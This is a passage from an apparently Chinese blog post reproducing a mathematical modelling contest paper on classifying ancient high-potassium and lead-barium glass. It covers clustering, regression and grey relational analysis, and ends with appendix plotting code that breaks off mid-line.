</center>将统计学规律计算出的系数<img src=".\国赛数学建模\wps41.jpg" style="zoom:80%;" />加入模型得：<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps42.jpg" style="zoom:100%;" /> </center>将铅钡玻璃的数据放入模型，最终未风化前的化学成分含量预测结果如下表5-5所示。<center>表5-5铅钡玻璃中风化点在风化前的化学成分含量的预测结果（部分）</center>|        | **SiO2** | **Na2O** | **K2O** | **CaO** | **MgO** | **Al2O3** | **Fe2O3** | **CuO** | **PbO** | **BaO** | **P2O5** | **SrO** | **SO2** || ------ | -------- | -------- | ------- | ------- | ------- | --------- | --------- | ------- | ------- | ------- | -------- | ------- | ------- || **2**  | 58.3986  |          | 1.5000  | 1.3343  | 0.9569  | 5.7300    | 3.8874    | 0.2600  | 27.8253 |         | 0.6645   | 0.1900  |         || **8**  | 59.6931  |          |         | 0.8437  |         | 1.3400    |           | 1.4100  | 16.3763 | 17.8323 | 0.6642   | 0.3700  | 1.4732  || **8**  | 62.6751  |          |         | 1.8186  |         | 1.1100    |           | 3.1400  | 18.5289 | 2.6720  | 1.3986   | 0.5300  | 8.7363  || **11** | 64.6478  |          | 0.2100  | 2.1510  | 0.5758  | 2.6900    |           | 4.9300  | 14.4977 | 8.3423  | 1.7353   | 0.3700  |         || **19** | 58.6627  |          |         | 1.67393 | 0.4784  | 3.5700    | 2.7797    | 3.5100  | 24.4522 | 3.5485  | 1.6336   | 0.1900  |         || **26** | 59.4844  |          |         | 0.82944 |         | 0.7000    |           | 1.5700  | 16.8616 | 18.4148 | 0.5795   | 0.4500  | 1.1192  |<h4 id="5-2问题二的求解与分析"><a href="#5-2问题二的求解与分析" class="headerlink" title="5.2问题二的求解与分析"></a>5.2问题二的求解与分析</h4><h5 id="5-2-1高钾玻璃、铅钡玻璃的分类规律"><a href="#5-2-1高钾玻璃、铅钡玻璃的分类规律" class="headerlink" title="5.2.1高钾玻璃、铅钡玻璃的分类规律"></a>5.2.1高钾玻璃、铅钡玻璃的分类规律</h5><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps43.jpg" style="zoom:80%;" /> </center><center>图5-10 无风化高钾玻璃和铅钡玻璃的化学成分比较折线图</center>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响。<p>通过表单2中的数据分析风化前高钾玻璃和铅钡玻璃各化学成分含量并计算出均值。由上图均值比对可得出如下规律：高钾玻璃氧化钾的含量远高于铅钡玻璃，铅钡玻璃氧化铅和氧化钡的含量远高于高钾玻璃，以化学成分含量为依据而将其分为高钾玻璃和铅钡玻璃，分类标准合理。</p><h5 id="5-2-2-数据预处理"><a href="#5-2-2-数据预处理" class="headerlink" title="5.2.2 数据预处理"></a>5.2.2 数据预处理</h5><p>在进行分类之前先进行数据的预处理。</p><p>玻璃的主要原料是石英砂，主要化学成分是二氧化硅（SiO2），所以二氧化硅这一化学成分的存在是古代玻璃所具有的共性，故将二氧化硅这一化学成分不作为分类依据。另外，针对不同类型的玻璃在分类时考虑自身突出特性对其他化学成分的掩盖影响应当剔除，由此铅钡玻璃在进行内部分类时，氧化铅和氧化钡不作为分类依据。同理，高钾玻璃在进行亚分类时氧化钾不作为分类依据。</p><p>数据来源上，将附件中表单2原始数据处理为高钾未风化、高钾风化、铅钡风化、铅钡无风化四种类型。根据假设条件，玻璃的分类是在完整未经风化状态下进行的，故而不考虑风化后的玻璃样本而将着眼点放在风化前的各样本数据上，这其中也包括了表面风化但局部未风化的样本即含有未风化点的样本，如23、25、28、29号文物等。经过数据剔除，最终考虑的样本数量状态为：无风化高钾玻璃12个样本，无风化铅钡玻璃23个样本。接下来对这些样本进行亚类划分。</p><h5 id="5-2-3-亚类划分"><a href="#5-2-3-亚类划分" class="headerlink" title="5.2.3 亚类划分"></a>5.2.3 亚类划分</h5><p>本文通过SPSS软件，采用系统聚类模型分别针对高钾和铅钡玻璃进行亚分类。</p><p>系统聚类分析将各样品各看成一类，然后计算类与类之间的距离，选择距离最小的一对合并为新类，计算新类与其他各类的距离，再将距离最近的两类合并，这样依次迭代，直到所有样品合为一类为之，由此实现不同样本之间的聚类。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps44.jpg" style="zoom:100%;" /> </center><center>图5-11 聚类分析基本思想</center>在确定要分类的数量时，本文采用肘部法则，用聚合系数折线图估计聚类的数量。聚合系数折线图的横纵坐标分别为聚类类别数K和聚合系数J。运用SPSS系统聚类分析可以得到聚合系数J，之后借助excel将系数降序排列，做出散点折线图，分析变化趋势。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps45.jpg" style="zoom:100%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps46.jpg" style="zoom:100%;" /></center><center>&nbsp&nbsp&nbsp&nbsp&nbsp图5-12 高钾玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp 图5-13铅钡玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</center>由折线变化趋势可得高钾玻璃在聚类别数为3时下降趋势渐缓，故判定高钾玻璃最佳聚类数为3，同理，判定铅钡玻璃最佳聚类数为6。<p>另外，在亚类划分时要考虑适合的化学成分，意即在划分完成后仍需进一步分析系统聚类结果中化学成分的内在联系，由此，在聚类完成后加入主观统计学分析，以系统聚类分析的结果为基础，与均值的比对为指引，寻找同一类样本之间化学成分上的联系，进而总结出规律，必要时可以重新组合类。</p><p>下面首先进行系统聚类分析：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps47.jpg" style="zoom:80%;" /> </center><center>图5-14 高钾玻璃12个样本的谱系图</center>表中纵轴以Casen的形式显示代表原表单中样本的排列顺序，以下分类中为方便表示直接使用数字n代表某样本。<center>表5-6 高钾玻璃文物采样点与序号的对应关系</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 01   | 03.1 | 03.2 | 04   | 0    | 06.1 | 06.2 | 13   | 14   | 16   | 21   | 18   |<center>表5-7 铅钡玻璃文物采样点与序号对应关系（部分）</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | …    || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 20   | 24   | 30.1 | 30.2 | 31   | 32   | 33   | 35   | 37   | 45   | 46   | 47   | …    |<p>注：03.1代表03部位1；03.2代表03部位2；30.1代表30部位1；30.2代表30部位2；</p><p>结合上图聚类结果将12个样本分为3类，分类结果如下： </p><center>表5-8 高钾玻璃初步聚类分析</center>| 类别  | 样本                || ----- | ------------------- || 类别1 | 1 2 3 4 5 8 9 10 11 || 类别2 | 6 7                 || 类别3 | 12                  |<p>之后进行统计学分析，观察各类之中有无化学成分含量突出或远高于均值的，抽象出分类标准。经过化学成分分析统计，比对得出高钾的三种分类标准：低铅钡、高磷、高铜。</p><center>表 5-9 高钾玻璃亚分类结果</center>| 类别            | 样本              || --------------- | ----------------- || 类别1（低铅钡） | 1 2 4 5 8 9 10 12 || 类别2（高磷）   | 6 7               || 类别3（高铜）   | 3 11              |<p> 同理，对于铅钡玻璃进行如下划分。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps48.jpg" style="zoom: 67%;" /> </center><center>图5-15 铅钡玻璃23个样品聚类情况</center>结合上图分类结果，将23个样本分为6类。<center>表 5-10 铅钡玻璃初步聚类分析</center>| 类别  | 样本                                    || ----- | --------------------------------------- || 类别1 | 1、21 、22                              || 类别2 | 12 、14 、18 、19                       || 类别3 | 6 、7 、8 、10 、11 、13、 15 、16、 23 || 类别4 | 4 、5                                   || 类别5 | 17 、20                                 || 类别6 | 2 、3、 9                               |<p>而后通过excel分析聚类中各化学成分含量，与均值进行比较得出5种分类标准：高磷、高钠、高铝、钙铁、高铜。</p><center>表5-11 铅钡玻璃亚分类结果</center>| 类别          | 样本                                    || ------------- | --------------------------------------- || 类别1（高磷） | 1 、21 、22                             || 类别2（高钠） | 12、 14 、18 、19 、13、 15             || 类别3（高铝） | 6、 7、 8 、10 、11 、16、 23 、17 、20 || 类别4（钙铁） | 3 、4、 5                               || 类别5（高铜） | 2 、9                                   |<h5 id="5-2-4合理性和敏感性检验"><a href="#5-2-4合理性和敏感性检验" class="headerlink" title="5.2.4合理性和敏感性检验"></a>5.2.4合理性和敏感性检验</h5><p>本文使用轮廓系数进行合理性检验，遍历簇数，计算对应轮廓系数，选择轮廓系数最大时对应的聚类模型。</p><p>单一轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps49.jpg" style="zoom:100%;" /> </center>其中a(i)表示i所属簇内其他样本的平均距离，b(i)表示i与其他簇的样本平均距离的最小值[3]。<p>聚类总体轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps50.jpg" style="zoom:100%;" /> </center>总轮廓系数S越接近1说明聚类越合理。<p>敏感性分析上，将具有典型化学成分含量特征的样本加入数据集，再次进行聚类分析，观测聚类结果是否与预料当中相同。本文中将问题一中预测的风化前的数据加入到高钾风化前、铅钡风化前的表单中进行聚类分析。分析是否与预期一致。</p><h4 id="5-3问题三的求解与分析"><a href="#5-3问题三的求解与分析" class="headerlink" title="5.3问题三的求解与分析"></a>5.3问题三的求解与分析</h4><h5 id="5-3-1鉴别未知类别玻璃文物所属类型"><a href="#5-3-1鉴别未知类别玻璃文物所属类型" class="headerlink" title="5.3.1鉴别未知类别玻璃文物所属类型"></a>5.3.1鉴别未知类别玻璃文物所属类型</h5><p>观察表单3所给出的未知类别玻璃文物数据发现，每条数据分为文物编号、表面风化和化学成分3个变量，我们判别玻璃文物类型前可以先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，然后再次对表单2的数据规律按照风化和无风化进行总结，找到合适作为自变量的化学成分，通过给予的未知类别玻璃文物数据和后期回归方程模型的建立计算出的预测结果，根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃。最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p><strong>Step1</strong> 表单2数据规律分析</p><p>在建立多元回归方程模型的时候发现，14个化学成分的比例分布不平衡，如果按照将显著性最大的二氧化硅作为因变量之一，来建立多元回归模型的话会导致影响因变量的自变量只有二氧化硅甚至使用的自变量皆无意义，无法将其余13个化学成分的比例价值凸显出来，进而能准确利用结果进行未知类别玻璃文物所属类型的鉴别。所以我们转而对表单2的数据间统计规律进一步深究，使用能显著代表文物类型且非二氧化硅的化学成分。</p><p>首先对于表单2的数据我们先划分为风化和无风化两个大类，在其中又分四小类分别是无风化高钾玻璃、无风化铅钡玻璃、无风化铅钡玻璃和风化铅钡玻璃。通过Python软件的matplotlib库画出箱图展现每一个小类中一维变量的统计规律。如下图5-16所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps51.png" style="zoom:100%;" /> </center><center>图5-16未风化高钾玻璃的箱图</center>箱图最大有点不受异常值的影响，它可以用一种相对稳定的方式描述数据的离散分布情况。箱图共有七大组成部分：上线、上四分位数、中位数、下四分位数、下线、四分位距离以及异常值。<p>之后根据箱图展现的统计规律和散点图展现的分布情况，进行以鉴别玻璃类型为目的数据整理，如下表5-12所示。</p><center>表5-12数据规律统计表（部分）</center>| 表面风化 |   类型    |      氧化钠       |        氧化钾         |      氧化钙       |                         |          氧化铝          || :------: | :-------: | :---------------: | :-------------------: | :---------------: | :---------------------: | :----------------------: ||   风化   | 高钾玻璃  |        无         |       0.59~1.01       | 0.21~1.07Max:1.66 |        0.54~0.64        |         0.81~3.5         || 铅钡玻璃 | 0.8~2.22  |     0.14~0.4      | 0.37~3.58Max:5.18,6.4 |     0.47~1.54     |   0.45~5.73Max:13.65    |                          ||  无风化  | 高钾玻璃  |     2.1~3.38      |      5.19~14.52       | 5.41~8.7Min:2.01  |        0.52~1.98        | 3.05~6.19Max:10.05,11.15 || 铅钡玻璃 | 0.92~3.38 | 0.11~0.35Max:0.71 |       0.38~2.98       |     0.51~1.67     | 1.44~6.5Max:14.34,12.69 |                          |<p>通过表5-12可知，高钾玻璃和铅钡玻璃的部分相同化学成分的变化范围是不相交的且存在明显的差异，我们可以在使用模型前直接判断出它的类型。同时可以将数据分类：第一类数据变化范围大，数值大可以考虑作为因变量，如未风化高钾的氧化铅和氧化钡；第二类数据整体波动适中，只出现几个较大值或较小值，可以考虑作为因变量或自变量，如氧化铜、氧化铁和氧化铝；第三类数据波动小且整体数值也小，还具有可以判别文物类型的特点，一般将其作为自变量，计算出的结果可以尽可能在表5-x的范围内，如未风化高钾的氧化锶。</p><p><strong>Step1</strong> 2多元回归模型求取文物所属类别</p><p>多元回归模型基本形式为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps52.jpg" style="zoom:100%;" /> </center>其中，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps133.jpg)为各项系数，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps134.jpg)为误差值。<p>在无风化高钾玻璃类别中，我们使用SPASS软件进行多次计算，获得如下回归模型分析表5-13。</p><p>因变量：氧化钙</p><p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-13 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps139.jpg) | 0.844 | 0.713 | 0.659     | 1.556     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-2.103</td><td>-3.145</td><td>0.006</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps140.jpg" alt="img"></td><td>0.121</td><td>5.195</td><td>0.000</td><td>1.300</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps141.jpg" alt="img"></td><td>-0.036</td><td>-1.048</td><td>0.310</td><td>1.218</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps142.jpg" alt="img"></td><td>0.261</td><td>4.987</td><td>0.000</td><td>1.275</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps53.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps54.jpg" style="zoom:80%;" /></center><center>   图5-17 氧化钙直方图           图5-18 正态P-P图</center>因变量：氧化铜<p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-14 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps148.jpg) | 0.904 | 0.818 | 0.785     | 1.260     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-1.782</td><td>-1.613</td><td>0.125</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps149.jpg" alt="img"></td><td>0.024</td><td>0.596</td><td>0.559</td><td>1.404</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps150.jpg" alt="img"></td><td>0.303</td><td>8.550</td><td>0.000</td><td>1.061</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps151.jpg" alt="img"></td><td>0.039</td><td>0.539</td><td>0.678</td><td>1.475</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps55.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps56.jpg" style="zoom:80%;" /></center><center>图5-19 氧化铜直方图  图5-20 氧化钙正态P-P图</center>因变量：氧化钠<p>预测变量：（常量），氧化铝<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps154.jpg" alt="img">，氧化钡<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps155.jpg" alt="img">，氧化铅<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps156.jpg" alt="img">，氧化铜<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps157.jpg" alt="img"></p><p>表5-15 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps158.jpg" alt="img"></td><td>0.904</td><td>0.818</td><td>0.785</td><td>1.260</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>1.504</td><td>.241</td><td>.891</td><td></td></tr><tr><td>氧化铅</td><td>-.047</td><td>-.401</td><td>.705</td><td>5.436</td></tr><tr><td>氧化钡</td><td>.249</td><td>.779</td><td>.471</td><td>6.629</td></tr><tr><td>氧化铜</td><td>1.191</td><td>2.652</td><td>.045</td><td>1.476</td></tr><tr><td>氧化铝</td><td>-.059</td><td>-.208</td><td>.843</td><td>11.614</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps159.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps160.jpg" alt="img"> </p><p>​            图5-20 氧化钠直方图                             图5-21 氧化钠正态P-P图</p><p>因变量：氧化钡            预测变量：（常量），氧化铜</p><p>表5-16 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps162.jpg" alt="img"></td><td>0.902</td><td>0.813</td><td>0.803</td><td>1.118</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>4.658</td><td>6.213</td><td>0.000</td><td></td></tr><tr><td>氧化铜</td><td>2.718</td><td>9.091</td><td>0.000</td><td>1.000</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps163.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps164.jpg" alt="img"> </p><p>​         图5-22 氧化钡直方图                            图 5-23 氧化钡 P-P图</p><p>以上分析可知，所有的显著性都满足小于0.05的条件，故多元回归方程可行。在无风化条件下，如果以上化学成分不满足高钾玻璃的情况，那么将其归类为铅钡玻璃。在风化条件下，我们发现可以看高钾玻璃的成分情况与数据规律统计表对比，如果不符合高钾玻璃则为铅钡玻璃。</p><p>将表单3数据输入，首先将数据分类为风化和未风化。分析风化数据我们首先依据数据规律统计表，如果符合就符合个数加1，通过对符合高钾和铅钡玻璃的条件的个数进行判断该未知文物类型。最终判断结果如表5-17所示。</p><p>表5-17 玻璃文物分类表</p><table><thead><tr><th></th><th>高钾玻璃</th><th>铅钡玻璃</th></tr></thead><tbody><tr><td>A2</td><td>6</td><td>2</td></tr><tr><td>A5</td><td>1</td><td>6</td></tr><tr><td>A6</td><td>8</td><td>0</td></tr><tr><td>A7</td><td>7</td><td>0</td></tr></tbody></table><p>但A2表数据缺失较多，但是含有类型特征较强的氧化铝，氧化铅，五氧化二磷3种化学成分，形成新的比例：高钾玻璃：铅钡玻璃=1：2，所以A2更可能是铅钡玻璃。</p><p>分析未风化数据，我们首先利用回归方程进行计算得：</p><table><thead><tr><th></th><th>氧化钠</th><th>氧化钙</th><th>氧化铜</th><th>氧化钡</th></tr></thead><tbody><tr><td>A1</td><td>3.59044</td><td>-0.21597</td><td>-1.50003</td><td>10.39298</td></tr><tr><td>A3</td><td>-0.27902</td><td>3.28207</td><td>0.70326</td><td>5.22878</td></tr><tr><td>A6</td><td>1.08907</td><td>2.38099</td><td>1.59438</td><td>7.26728</td></tr><tr><td>A7</td><td>11.11155</td><td>0.61212</td><td>2.24646</td><td>29.14718</td></tr></tbody></table><p>综上，高钾玻璃分别是A1,A4,A6,A7,铅钡玻璃分别是A2,A3,A5,A8</p><h4 id="5-4问题四的求解与分析"><a href="#5-4问题四的求解与分析" class="headerlink" title="5.4问题四的求解与分析"></a>5.4问题四的求解与分析</h4><p>我们可以使用灰色关联分析的方式对比较不同类别之间的化学成分关联关系的差异性</p><h5 id="5-4-1-数据无量纲化处理"><a href="#5-4-1-数据无量纲化处理" class="headerlink" title="5.4.1 数据无量纲化处理"></a>5.4.1 数据无量纲化处理</h5><p>将题目给出表单2中，原始分类中的未经过风化的高钾玻璃与铅钡玻璃的数据分别导入SPSS，并通过Z-score标准化法对其中各项数据进行无量纲化。</p><p>Z-score标准化法公式如下：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps165.jpg" alt="img"> </p><p>Z-score标准化法,首先计算该指标的均值<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps166.jpg" alt="img">和标准差，然后用该变量的每一个观察值x减去均值x，再除以其标准差。</p><p>数据经过Z-score标准化后，将符合标准正态分布（0-1），即将有约一半观察值的数值小于0，另一半观察值的数值大于0，变量的均值为0，标准差为1，在本题的求解过程中，数据的标准化通过SPSS软件对数据分析获取[4]。</p><h5 id="5-4-2-灰色关联分析不同类别之间的化学成分关联关系"><a href="#5-4-2-灰色关联分析不同类别之间的化学成分关联关系" class="headerlink" title="5.4.2 灰色关联分析不同类别之间的化学成分关联关系"></a>5.4.2 灰色关联分析不同类别之间的化学成分关联关系</h5><p>将数据转置生成如下矩阵：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps167.jpg" alt="img"> </p><p>其中参数m是变量类型，结合表单2可知，在当前数据集下m=14</p><p>关联程度实质是参考数列与比较数列曲线形状的相似程度。凡比较数列与参考数列的曲线形状接近，则两者间的关联度较大；反之，如果曲线形状相差较大，则两者间的关联度较小。因此，可用曲线间的差值大小作为关联度的衡量标准。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps168.jpg" alt="img"> </p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps169.jpg" alt="img"> </p><p>其中ρ为分辨系数,用于降低Δ(max)过大而使关联系数出现较大误差，其取值范围(0,1)。当ρ越小，关联系数间差异越大，区分能力越强。在实现过程中ρ取值为0.5.</p><p>在本题的求解过程中，通过Matlab编程实现计算每个被评价对象指标序列，参考序列对应元素的绝对差值，并最终求出关联系数，并对其进行排序。（实现代码见附录）</p><h5 id="5-4-3-差异性分析"><a href="#5-4-3-差异性分析" class="headerlink" title="5.4.3 差异性分析"></a>5.4.3 差异性分析</h5><p>最后对关联度进行排序，得到相应类型下的关联度顺序。</p><p>其中高钾玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">19.0240</span> <span class="token number">18.1279</span> <span class="token number">18.2748</span> <span class="token number">19.2907</span> <span class="token number">20.5374</span> <span class="token number">19.9724</span> <span class="token number">18.3470</span> <span class="token number">18.1501</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span> <span class="token number">18.5236</span> <span class="token number">20.0456</span> <span class="token number">21.3854</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，7，13，3，11，5，2，4，12，8，10，9，6，14</p><p>不同的是铅钡玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">21.3854</span> <span class="token number">20.5374</span> <span class="token number">20.0456</span> <span class="token number">19.9724</span> <span class="token number">19.2907</span> <span class="token number">19.0240</span> <span class="token number">18.5236</span> <span class="token number">18.3470</span> <span class="token number">18.2748</span> <span class="token number">18.1501</span> <span class="token number">18.1279</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，14，6，13，7，5，2，12，8, 4，9 ，3，10，11</p><p>比较二者关联度顺序，即可证明不同类别之间的化学成分关联具有显著差异性</p><h3 id="六、模型的评价与推广"><a href="#六、模型的评价与推广" class="headerlink" title="六、模型的评价与推广"></a>六、模型的评价与推广</h3><h4 id="6-1模型的优点"><a href="#6-1模型的优点" class="headerlink" title="6.1模型的优点"></a>6.1模型的优点</h4><p>在分析文物样品表面有无风化化学成分含量的统计规律时，将整个决策过程分为两部分，分别基于多元回归和最小二乘法进行拟合，保证了数据分析结果的可靠。</p><p>在实现系统聚类后，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。</p><p>使用灰色关联分析方式能够很好的处理部分信息未知、部分信息已知的数据。</p><h4 id="6-2-模型的缺点"><a href="#6-2-模型的缺点" class="headerlink" title="6.2 模型的缺点"></a>6.2 模型的缺点</h4><p>进行亚类划分时，系统聚类完成后又加以统计学分析，对于一些规律不很明显的组合进行人工干预重新组合，虽然有利于划分，但在客观上也导致了模型主观性成分的提高。</p><h4 id="6-3-模型的优化"><a href="#6-3-模型的优化" class="headerlink" title="6.3 模型的优化"></a>6.3 模型的优化</h4><p>题目附件中数据量较少，随着建模过程的不断深入及划分亚类之后，每种亚类之间的数据量也过少，划分有较大误差。可以通过获取更大数据集对模型进行优化。</p><h3 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h3><p>[1] 李青会,干福熹 .关于中国古代玻璃研究的几个问题[J]. 自然科学史研究，2007年，26卷：234-247</p><p>[2] 段浩,干福熹,赵虹霞.实验室模拟过渡金属离子掺杂的中国古代玻璃的着色现象[J]. 硅酸盐学报 2009年12期</p><p>[3] 孙林,刘梦含,徐久成.基于优化初始聚类中心和轮廓系数的K-means聚类算法[J].模糊系统与数学,2022,36(01):47-65.</p><p>[4] 孙芳芳.浅议灰色关联度分析方法及其应用[J].科技信息, 2010</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>附录说明：</p><ol><li><p>各类玻璃元素对比组成可视化python实现</p></li><li><p>高钾玻璃各组成成分的拟合曲线python实现代码</p></li><li><p>对高钾玻璃、铅钡玻璃进行亚分类的划分结果</p></li><li><p>灰色关联分析Matlab代码实现</p></li><li><p>表单2数据规律统计表</p></li></ol><h4 id="附录1-各类玻璃元素对比组成可视化python实现"><a href="#附录1-各类玻璃元素对比组成可视化python实现" class="headerlink" title="附录1  各类玻璃元素对比组成可视化python实现"></a>附录1  各类玻璃元素对比组成可视化python实现</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"二氧化硅"</span><span class="token punctuation">,</span><span class="token string">"氧化钠"</span><span class="token punctuation">,</span><span class="token string">"氧化钾"</span><span class="token punctuation">,</span><span class="token string">"氧化钙"</span><span class="token punctuation">,</span><span class="token string">"氧化镁"</span><span class="token punctuation">,</span><span class="token string">"氧化铝"</span><span class="token punctuation">,</span><span class="token string">"氧化铁"</span><span class="token punctuation">,</span><span class="token string">"氧化铜"</span><span class="token punctuation">,</span><span class="token string">"氧化铅"</span><span class="token punctuation">,</span><span class="token string">"氧化钡"</span><span class="token punctuation">,</span><span class="token string">"五氧化二磷"</span><span class="token punctuation">,</span><span class="token string">"氧化锶"</span><span class="token punctuation">,</span><span class="token string">"氧化锡"</span><span class="token punctuation">,</span><span class="token string">"二氧化硫"</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">68.71125</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9.031428571</span><span class="token punctuation">,</span><span class="token number">5.541428571</span><span class="token punctuation">,</span><span class="token number">1.462857143</span><span class="token punctuation">,</span><span class="token number">6.8525</span><span class="token punctuation">,</span><span class="token number">2.768571429</span><span class="token punctuation">,</span><span class="token number">2.895</span><span class="token punctuation">,</span><span class="token number">0.642</span><span class="token punctuation">,</span><span class="token number">1.795</span><span class="token punctuation">,</span><span class="token number">1.75</span><span class="token punctuation">,</span><span class="token number">0.0975</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.406666667</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">94.286</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">0.712</span><span class="token punctuation">,</span><span class="token number">0.54</span><span class="token 